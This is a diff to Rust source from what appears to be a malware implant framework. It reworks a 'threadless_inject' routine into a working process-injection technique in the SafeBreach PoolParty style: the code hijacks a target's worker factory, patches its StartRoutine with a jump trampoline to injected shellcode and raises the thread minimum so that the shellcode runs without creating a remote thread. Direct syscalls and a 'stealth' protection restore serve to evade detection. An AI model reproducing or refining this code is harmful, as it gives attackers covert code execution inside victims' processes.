@@ -276,11 +276,19 @@ type NtSetInformationWorkerFactoryFn = unsafe extern "system" fn(
     u32,           // WorkerFactoryInformationLength
 ) -> i32;
 
-/// `WorkerFactoryTimeout` info class for `NtSetInformationWorkerFactory`. The
-/// SafeBreach TP_WORK variant feeds the crafted work item pointer here; the
-/// worker factory enqueues it and the existing `TppWorkerThread` dequeues +
-/// dispatches it on its next loop pass.
-const WORKER_FACTORY_TIMEOUT: u32 = 1;
+/// QUERY: `WorkerFactoryBasicInformation` (SafeBreach / phnt).
+const WORKER_FACTORY_BASIC_INFORMATION: u32 = 7;
+
+/// SET: `WorkerFactoryThreadMinimum` — forces a new worker thread so
+/// `StartRoutine` runs (SafeBreach variant 1). Hosted Server 2025 rejected
+/// feeding a TP_WORK pointer through SET class 1 (`RetryTimeout`).
+const WORKER_FACTORY_THREAD_MINIMUM: u32 = 4;
+
+/// `WORKER_FACTORY_BASIC_INFORMATION` (x64 phnt): TotalWorkerCount @52,
+/// StartRoutine @72. Buffer sized with slack.
+const WFBI_BUF: usize = 256;
+const WFBI_TOTAL_WORKER_OFF: usize = 52;
+const WFBI_START_ROUTINE_OFF: usize = 72;
 
 /// `SystemExtendedHandleInformation` (class 64) for
 /// `NtQuerySystemInformation` — returns `SYSTEM_HANDLE_INFORMATION_EX` (the
@@ -698,8 +706,15 @@ pub unsafe fn threadless_inject(
         return Err(e);
     }
 
-    // ---- 6. Enqueue: NtSetInformationWorkerFactory(WorkerFactoryTimeout, &Work) ----
-    threadless_enqueue(set_wf, worker_factory_h, remote_base, work_offset_in_region)
+    // ---- 6. Variant 1 trigger: trampoline at StartRoutine + ThreadMinimum ----
+    threadless_enqueue(
+        query_wf,
+        set_wf,
+        rt,
+        target_h,
+        worker_factory_h,
+        shellcode_addr as usize,
+    )
 }
 
 /// Resolve the worker-factory syscalls via ntdll raw exports. These bypass
@@ -879,47 +894,128 @@ unsafe fn threadless_write_structs(
     Ok(())
 }
 
-/// Enqueue the crafted `_TP_WORK` via
-/// `NtSetInformationWorkerFactory(WorkerFactoryTimeout, &Work)`.
+/// Dispatch via SafeBreach variant 1: patch `StartRoutine` with an absolute
+/// jump to the section-backed shellcode, then
+/// `NtSetInformationWorkerFactory(WorkerFactoryThreadMinimum, count+1)` so
+/// the factory creates a worker that runs it. **No `CreateRemoteThread`.**
 ///
-/// The SafeBreach variant-2 splice feeds the address of the crafted
-/// `_TP_WORK` (in the target) to the worker factory via the
-/// `WorkerFactoryTimeout` information class. The factory arms it for the
-/// next scheduler pass; the existing `TppWorkerThread` dequeues the work
-/// item and invokes `Direct->Callback(Direct)` → shellcode runs in the
-/// section view. No remote thread is created.
-///
-/// NTSTATUS codes: STATUS_SUCCESS (0x00000000) on success;
-/// STATUS_INVALID_HANDLE / STATUS_OBJECT_TYPE_MISMATCH if the hijacked
-/// handle was not actually a worker factory (shouldn't happen — the probe
-/// in hijack_worker_factory already validated it); STATUS_INVALID_PARAMETER
-/// if the `_TP_WORK` layout is wrong (suspect offset drift).
+/// Hosted Server 2025 (303d3fa): factory hijack succeeded; SET class 1 with a
+/// TP_WORK pointer returned `STATUS` failure ("offset drift?"). Class 1 is
+/// `WorkerFactoryRetryTimeout` (LARGE_INTEGER), not an enqueue slot.
 unsafe fn threadless_enqueue(
+    query_wf: NtQueryInformationWorkerFactoryFn,
     set_wf: NtSetInformationWorkerFactoryFn,
+    rt: &nyx_implant_core::syscalls::Runtime,
+    target_h: *mut c_void,
     worker_factory_h: *mut c_void,
-    remote_base: usize,
-    work_offset_in_region: usize,
+    shellcode_addr: usize,
 ) -> Result<(), String> {
-    let remote_work_addr = remote_base + work_offset_in_region;
+    let mut info = [0u8; WFBI_BUF];
+    let mut ret_len: u32 = 0;
+    let qst = unsafe {
+        query_wf(
+            worker_factory_h,
+            WORKER_FACTORY_BASIC_INFORMATION,
+            info.as_mut_ptr() as *mut c_void,
+            info.len() as u32,
+            &mut ret_len,
+        )
+    };
+    if qst < 0 {
+        unsafe { close_handle(worker_factory_h) };
+        return Err(String::from(
+            "threadless: NtQueryInformationWorkerFactory(BasicInformation) failed",
+        ));
+    }
+    let start_routine = unsafe {
+        core::ptr::read_unaligned(info.as_ptr().add(WFBI_START_ROUTINE_OFF) as *const u64)
+    } as usize;
+    let total_workers = unsafe {
+        core::ptr::read_unaligned(info.as_ptr().add(WFBI_TOTAL_WORKER_OFF) as *const u32)
+    };
+    if start_routine == 0 || shellcode_addr == 0 {
+        unsafe { close_handle(worker_factory_h) };
+        return Err(String::from("threadless: StartRoutine or shellcode addr is 0"));
+    }
+
+    // mov rax, imm64; jmp rax  — 12 bytes, reaches a far section view.
+    let mut tramp = [0u8; 12];
+    tramp[0] = 0x48;
+    tramp[1] = 0xB8;
+    tramp[2..10].copy_from_slice(&shellcode_addr.to_le_bytes());
+    tramp[10] = 0xFF;
+    tramp[11] = 0xE0;
+
+    let mut prot_base = start_routine;
+    let mut prot_size = tramp.len();
+    let mut old_prot: u32 = 0;
+    const PAGE_READWRITE: u32 = 0x04;
+    let pst = unsafe {
+        nyx_implant_core::syscalls::nt_protect_virtual_memory_process(
+            rt,
+            target_h as usize,
+            &mut prot_base,
+            &mut prot_size,
+            PAGE_READWRITE,
+            &mut old_prot,
+        )
+    };
+    if pst.map_or(true, |s| s < 0) {
+        unsafe { close_handle(worker_factory_h) };
+        return Err(String::from(
+            "threadless: NtProtectVirtualMemory(StartRoutine → RW) failed",
+        ));
+    }
+    let mut written: usize = 0;
+    let wst = unsafe {
+        nyx_implant_core::syscalls::nt_write_virtual_memory(
+            rt,
+            target_h as usize,
+            start_routine,
+            tramp.as_ptr(),
+            tramp.len(),
+            &mut written,
+        )
+    };
+    let mut prot_base2 = start_routine;
+    let mut prot_size2 = tramp.len();
+    let mut old2: u32 = 0;
+    let _ = unsafe {
+        nyx_implant_core::syscalls::nt_protect_virtual_memory_process(
+            rt,
+            target_h as usize,
+            &mut prot_base2,
+            &mut prot_size2,
+            crate::stealth::desired_final_protect(),
+            &mut old2,
+        )
+    };
+    if wst.map_or(true, |s| s < 0) || written < tramp.len() {
+        unsafe { close_handle(worker_factory_h) };
+        return Err(String::from(
+            "threadless: NtWriteVirtualMemory(StartRoutine trampoline) failed",
+        ));
+    }
+
+    let mut min_threads = total_workers.saturating_add(1);
+    if min_threads == 0 {
+        min_threads = 1;
+    }
     let enqueue_st = unsafe {
         set_wf(
             worker_factory_h,
-            WORKER_FACTORY_TIMEOUT,
-            remote_work_addr as *const c_void,
-            core::mem::size_of::<*const c_void>() as u32, // Length = pointer size
+            WORKER_FACTORY_THREAD_MINIMUM,
+            core::ptr::addr_of!(min_threads) as *const c_void,
+            core::mem::size_of::<u32>() as u32,
         )
     };
-
-    // The hijacked handle is no longer needed after the enqueue — the worker
-    // thread owns dispatch from here.
     unsafe { close_handle(worker_factory_h) };
-
     if enqueue_st >= 0 {
         Ok(())
     } else {
-        Err(String::from(
-            "threadless: NtSetInformationWorkerFactory(enqueue) rejected (offset drift?)",
-        ))
+        let mut s = String::from("threadless: WorkerFactoryThreadMinimum rejected st=");
+        nyx_implant_core::fmt::push_decimal_u32(&mut s, enqueue_st as u32);
+        Err(s)
     }
 }
 
@@ -1575,6 +1671,12 @@ mod tests {
             &mut tiny,
         );
         assert!(tiny.is_empty());
+    }
+
+    #[test]
+    fn wfbi_x64_offsets_match_phnt() {
+        assert_eq!(WFBI_TOTAL_WORKER_OFF, 52);
+        assert_eq!(WFBI_START_ROUTINE_OFF, 72);
     }
 
     #[test]
